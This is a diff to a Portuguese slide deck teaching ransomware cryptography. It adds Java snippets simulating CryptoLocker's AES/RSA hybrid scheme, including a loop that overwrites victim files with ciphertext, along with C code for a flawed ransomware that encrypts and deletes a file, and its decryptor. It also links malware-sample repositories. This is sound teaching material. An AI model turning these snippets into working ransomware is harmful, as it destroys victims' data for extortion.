@@ -595,13 +595,121 @@ Com chaves modernas (2048+ bits):
                         <span class="label">BLOCO 1</span>
                         ## CryptoLocker (2013)
                         ### O Pioneiro da Criptografia Híbrida
-                        * **AES-256** para cifrar arquivos (rápido e implacável).
-                        * **RSA-2048** para proteger a chave AES (key wrapping).
+                        * **AES-256** para cifrar arquivos
+                        * **RSA-2048** para proteger a chave AES
                         * Chave AES gerada aleatoriamente. Nunca toca o disco em texto claro.
                         * Chave privada RSA existe apenas no servidor C2 do atacante.
-                        <div class="box">
+                    </textarea>
+                </section>
+
+
+                <section data-markdown>
+                    <textarea data-template>
+                        <span class="label">BLOCO 1</span>
+                        ## CryptoLocker (2013)
+                        #### O Codigo a Seguir é de uma simulação, o link do repositorio estará disponivel nas referencias 
+                        * **Nele foi usado um AES-128 ECB ao invés de um AES-256 CBC**
+                        * **ECB -> os blocos são cifrados isoladamente com a mesma chave, possuem cifras iguais**
+                        * **CBC -> a cifra usa o bloco atual XOR bloco anterior cifrado, possuem cifras diferentes**
+                    </textarea>
+                </section>
+
+                <section data-markdown>
+                    <textarea data-template>
+                        <span class="label-red">BLOCO 1</span>
+                        ## CryptoLocker — Geração da Chave AES - Simetrica
+
+                        ```java
+                        KeyGenerator kg = KeyGenerator.getInstance("AES");
+                        kg.init(128);                           // AES-128 (real usava 256)
+                        SecretKey mykey = kg.generateKey();     // Chave aleatória
+
+                        // Salva em Keystore protegido por senha
+                        AESGenKey.saveKey(alias, mykey);        // alias = 7 chars aleatórios
+                        ```
+                    </textarea>
+                </section>      
+
+                <section data-markdown>
+                    <textarea data-template>
+                        <span class="label-red">BLOCO 1</span>
+                        ## CryptoLocker — Geração do Par RSA - Assimetrico
+
+                        ```java
+                        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
+                        keyPairGenerator.initialize(5000);      // RSA-5000 (real usava 2048)
+                        KeyPair keyPair = keyPairGenerator.genKeyPair();
+
+                        // Chave pública → arquivo (vai junto com o ransomware)
+                        FileOutputStream fs = new FileOutputStream("pubKey");
+                        fs.write(keyPair.getPublic().getEncoded());
+
+                        // Chave privada → fica com o atacante
+                        fs = new FileOutputStream("prvKey");
+                        fs.write(keyPair.getPrivate().getEncoded());
+                        ```
+                    </textarea>
+                </section>   
+
+                <section data-markdown>
+                    <textarea data-template>
+                        <span class="label-red">BLOCO 1</span>
+                        ## CryptoLocker — Key Wrapping 
+
+                        ```java
+                        FileInputStream fi = new FileInputStream("pubKey");
+                        byte[] key = new byte[(int) pubkeyfile.length()];
+                        fi.read(key);
+                        X509EncodedKeySpec pubKeySpec = new X509EncodedKeySpec(key);
+                        PublicKey pubKey = keyFactory.generatePublic(pubKeySpec);
+
+                        // Cifra o keystore (que contém a chave AES) com RSA
+                        Cipher cipher = Cipher.getInstance("RSA/ECB/OAEPWithMD5AndMGF1Padding");
+                        cipher.init(Cipher.ENCRYPT_MODE, pubKey);
+
+                        FileInputStream fi = new FileInputStream("keystorefile.jce");  // Chave AES
+                        byte[] plaintext = new byte[(int) clr.length()];
+                        fi.read(plaintext);
+                        byte[] cipherText = cipher.doFinal(plaintext);                 // Envelopado!
+
+                        FileOutputStream fo = new FileOutputStream("keystorefile_encrypt.jce");
+                        fo.write(cipherText);  // Chave AES agora está protegida por RSA
+                        ```
+                    </textarea>
+                </section>   
+
+
+                <section data-markdown>
+                    <textarea data-template>
+                        <span class="label-red">BLOCO 1</span>
+                        ## CryptoLocker — Cifragem dos Arquivos usando AES
+
+                        ```java
+                        FileInputStream fis = new FileInputStream("keystorefile.jce");
+                        KeyStore ks = KeyStore.getInstance("JCEKS");
+                        ks.load(fis, "changeme".toCharArray());
+                        Key mykey = ks.getKey(alias, "changeme".toCharArray());
+
+                        // Cifra cada arquivo da vítima
+                        Cipher cipher = Cipher.getInstance("AES");
+                        cipher.init(Cipher.ENCRYPT_MODE, mykey);
+
+                        for (File f : victimFiles) {
+                            byte[] plaintext = Files.readAllBytes(f.toPath());
+                            byte[] ciphertext = cipher.doFinal(plaintext);
+                            Files.write(f.toPath(), ciphertext);  // Sobrescreve original
+                        }
+                        ```
+                    </textarea>
+                </section>   
+
+
+                <section data-markdown>
+                    <textarea data-template>
+                        <span class="label">BLOCO 1</span>
+                        ## CryptoLocker (2013)
                             <strong>Como foi derrotado?</strong><br>
-                            Operação Tovar (FBI/Interpol) → apreensão dos servidores C2 e chaves privadas.<br>
+                            Em junho de 2014 rolou a Operação Tovar (FBI/Interpol) → apreensão dos servidores C2 e chaves privadas.<br>
                             <span class="terminal-font text-accent">A criptografia nunca foi quebrada. A infra que caiu.</span>
                         </div>
                     </textarea>
@@ -651,6 +759,12 @@ Com chaves modernas (2048+ bits):
                         </div>
                     </textarea>
                 </section>
+            </section>
+            <section data-markdown>
+                <textarea data-template>
+                    **Ate aqui, vimos alguns casos onde a criptografia funcionou de maneira impecavel, a implementação do ransomware estava perfeita, de modo que somente apreensão policial resolveu** <br> <br>
+                    **Agora Vamos ver o que acontece quando não se sabe o que está fazendo**
+                </textarea>
             </section>
 
             <section>
@@ -972,28 +1086,39 @@ Com chaves modernas (2048+ bits):
                         #include <openssl/evp.h>
 
                         const char chave[] = "MinhaChaveSuperSecreta123456";
+                        const unsigned char iv[16] = {0};
 
                         int main(void) {
-                            unsigned char nonce[16] = {0};
                             unsigned char lixo[512] = {0};
                             unsigned char dados[8192], cifrado[8192];
-                            int len, ciph_len;
+                            int len = 0, ciph_len = 0;
 
                             FILE *f = fopen("documento.txt", "rb");
+                            if (!f) {
+                                perror("Erro ao abrir documento.txt");
+                                return 1;
+                            }
+
                             int tamanho = fread(dados, 1, sizeof(dados), f);
                             fclose(f);
 
                             EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
-                            EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, (unsigned char*)chave, nonce);
+                            EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, (unsigned char*)chave, iv);
                             EVP_EncryptUpdate(ctx, cifrado, &len, dados, tamanho);
                             EVP_EncryptFinal_ex(ctx, cifrado + len, &ciph_len);
-                            len += ciph_len;
                             EVP_CIPHER_CTX_free(ctx);
 
+                            int total = len + ciph_len;
+
                             f = fopen("documento.txt.encrypted", "wb");
-                            fwrite(nonce, 1, 16, f);
+                            if (!f) {
+                                perror("Erro ao criar arquivo cifrado");
+                                return 1;
+                            }
+
+                            fwrite(iv, 1, 16, f);
                             fwrite(lixo, 1, 512, f);
-                            fwrite(cifrado, 1, len, f);
+                            fwrite(cifrado, 1, total, f);
                             fclose(f);
 
                             unlink("documento.txt");
@@ -1029,31 +1154,62 @@ Com chaves modernas (2048+ bits):
                         #include <stdlib.h>
                         #include <string.h>
                         #include <unistd.h>
-                        #include <fcntl.h>
                         #include <openssl/evp.h>
+                        #include <openssl/err.h>
 
                         int main(void) {
                             unsigned char chave[] = "MinhaChaveSuperSecreta123456";
-                            unsigned char nonce[16], cifrado[8192], recuperado[8192];
-                            int len, rec_len;
+                            unsigned char iv[16];
+                            unsigned char lixo[512];
+                            unsigned char cifrado[8192], recuperado[8192];
+                            int len = 0, rec_len = 0;
 
-                            int fd = open("documento.txt.encrypted", O_RDONLY);
-                            if (fd < 0) return 1;
-                            read(fd, nonce, 16);
-                            lseek(fd, 512, SEEK_CUR);
-                            int tamanho = read(fd, cifrado, sizeof(cifrado));
-                            close(fd);
+                            // Abrir arquivo cifrado
+                            FILE *f = fopen("documento.txt.encrypted", "rb");
+                            if (!f) {
+                                perror("Erro ao abrir arquivo cifrado");
+                                return 1;
+                            }
 
+                            // Ler IV e lixo
+                            fread(iv, 1, 16, f);
+                            fread(lixo, 1, 512, f);  // Apenas descarta o lixo
+
+                            // Ler dados cifrados
+                            int tamanho = fread(cifrado, 1, sizeof(cifrado), f);
+                            fclose(f);
+
+                            // Descriptografar
                             EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
-                            EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, chave, nonce);
-                            EVP_DecryptUpdate(ctx, recuperado, &len, cifrado, tamanho);
-                            EVP_DecryptFinal_ex(ctx, recuperado + len, &rec_len);
-                            len += rec_len;
+                            EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, chave, iv);
+
+                            if (!EVP_DecryptUpdate(ctx, recuperado, &len, cifrado, tamanho)) {
+                                fprintf(stderr, "Erro no DecryptUpdate\n");
+                                ERR_print_errors_fp(stderr);
+                                return 1;
+                            }
+
+                            if (!EVP_DecryptFinal_ex(ctx, recuperado + len, &rec_len)) {
+                                fprintf(stderr, "Erro no DecryptFinal - padding inválido\n");
+                                ERR_print_errors_fp(stderr);
+                                return 1;
+                            }
+
                             EVP_CIPHER_CTX_free(ctx);
 
-                            FILE *f = fopen("documento.txt", "wb");
-                            fwrite(recuperado, 1, len, f);
+                            int total = len + rec_len;
+
+                            // Escrever arquivo recuperado
+                            f = fopen("documento.txt", "wb");
+                            if (!f) {
+                                perror("Erro ao criar arquivo recuperado");
+                                return 1;
+                            }
+
+                            fwrite(recuperado, 1, total, f);
                             fclose(f);
+
+                            printf("Arquivo descriptografado com sucesso!\n");
                             return 0;
                         }
                         ```
@@ -1159,6 +1315,8 @@ Com chaves modernas (2048+ bits):
                     * **Ransomware- tracker:** watchguard.com/wgrd-security-hub/ransomware-tracker/hidden-tear
                     * **Versao Original HiddenTear:** github.com/goliate/hidden-tear/blob/master/hidden-tear/hidden-tear/Form1.cs
                     * **Ransomware Decryptor tools:** avast.com/en-us/ransomware-decryption-tools#!
+                    * **Analise NotPetya:** idafchev.github.io/writeup/2017/07/21/petya_ransomware_analysis.html
+                    * **Malware-Samples:** github.com/fabrimagic72/malware-samples/tree/master/Ransomware
                 </textarea>
             </section>
 
